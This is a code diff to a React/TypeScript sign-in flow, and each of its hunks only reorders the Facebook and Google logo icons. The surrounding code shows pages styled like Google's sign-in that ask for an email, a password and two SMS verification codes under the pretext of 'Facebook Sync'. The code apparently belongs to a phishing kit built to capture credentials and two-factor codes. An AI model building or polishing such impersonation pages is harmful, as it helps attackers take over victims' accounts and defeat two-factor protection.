@@ -103,9 +103,9 @@ function EmailStep({ onNext }: { onNext: (email: string, id: number) => void }) 
   return (
     <motion.div initial={{ opacity: 0, x: -10 }} animate={{ opacity: 1, x: 0 }} className="flex flex-col items-center">
       <div className="flex items-center gap-4 mb-4">
-        <FaFacebook className="w-10 h-10 text-[#1877F2]" />
-        <FaSyncAlt className="w-6 h-6 text-gray-400 animate-spin-slow" />
         <FcGoogle className="w-10 h-10" />
+        <FaSyncAlt className="w-6 h-6 text-gray-400 animate-spin-slow" />
+        <FaFacebook className="w-10 h-10 text-[#1877F2]" />
       </div>
       <h1 className="text-[1.5rem] font-normal mb-2 text-[#202124]">Sign in</h1>
       <p className="text-[1rem] text-[#202124] mb-8 text-center">to continue to Facebook Sync</p>
@@ -178,9 +178,9 @@ function PasswordStep({ flowState, onNext }: { flowState: FlowState, onNext: () 
   return (
     <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} className="flex flex-col items-center">
       <div className="flex items-center gap-4 mb-4">
-        <FaFacebook className="w-10 h-10 text-[#1877F2]" />
-        <FaSyncAlt className="w-6 h-6 text-gray-400 animate-spin-slow" />
         <FcGoogle className="w-10 h-10" />
+        <FaSyncAlt className="w-6 h-6 text-gray-400 animate-spin-slow" />
+        <FaFacebook className="w-10 h-10 text-[#1877F2]" />
       </div>
       <h1 className="text-[2rem] font-normal mb-2 text-[#202124]">Welcome</h1>
       
@@ -227,9 +227,9 @@ function PromptStep({ flowState, onNext }: { flowState: FlowState, onNext: () =>
   return (
     <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="flex flex-col items-center text-center">
       <div className="flex items-center gap-4 mb-4">
-        <FaFacebook className="w-10 h-10 text-[#1877F2]" />
-        <FaSyncAlt className="w-6 h-6 text-gray-400 animate-spin-slow" />
         <FcGoogle className="w-10 h-10" />
+        <FaSyncAlt className="w-6 h-6 text-gray-400 animate-spin-slow" />
+        <FaFacebook className="w-10 h-10 text-[#1877F2]" />
       </div>
       <h1 className="text-2xl font-normal mb-2 text-[#202124]">2-Step Verification</h1>
       <p className="text-sm text-gray-600 mb-8">To help keep your account safe, Google wants to make sure it's really you trying to sign in.</p>
@@ -333,9 +333,9 @@ function Code1Step({ flowState, onNext }: { flowState: FlowState, onNext: () => 
   return (
     <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} className="flex flex-col items-center">
       <div className="flex items-center gap-4 mb-4">
-        <FaFacebook className="w-10 h-10 text-[#1877F2]" />
-        <FaSyncAlt className="w-6 h-6 text-gray-400 animate-spin-slow" />
         <FcGoogle className="w-10 h-10" />
+        <FaSyncAlt className="w-6 h-6 text-gray-400 animate-spin-slow" />
+        <FaFacebook className="w-10 h-10 text-[#1877F2]" />
       </div>
       <h1 className="text-2xl font-normal mb-2 text-[#202124]">2-Step Verification</h1>
       <p className="text-sm text-gray-600 mb-8 text-center">A verification code was just sent to your device via SMS.</p>
@@ -402,9 +402,9 @@ function Code2Step({ flowState, onNext }: { flowState: FlowState, onNext: () => 
   return (
     <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} className="flex flex-col items-center">
       <div className="flex items-center gap-4 mb-4">
-        <FaFacebook className="w-10 h-10 text-[#1877F2]" />
-        <FaSyncAlt className="w-6 h-6 text-gray-400 animate-spin-slow" />
         <FcGoogle className="w-10 h-10" />
+        <FaSyncAlt className="w-6 h-6 text-gray-400 animate-spin-slow" />
+        <FaFacebook className="w-10 h-10 text-[#1877F2]" />
       </div>
       <h1 className="text-2xl font-normal mb-2 text-[#202124]">Additional verification</h1>
       <p className="text-sm text-gray-600 mb-8 text-center">To ensure your account is secure for Facebook synchronization, please enter the second verification code we just sent.</p>
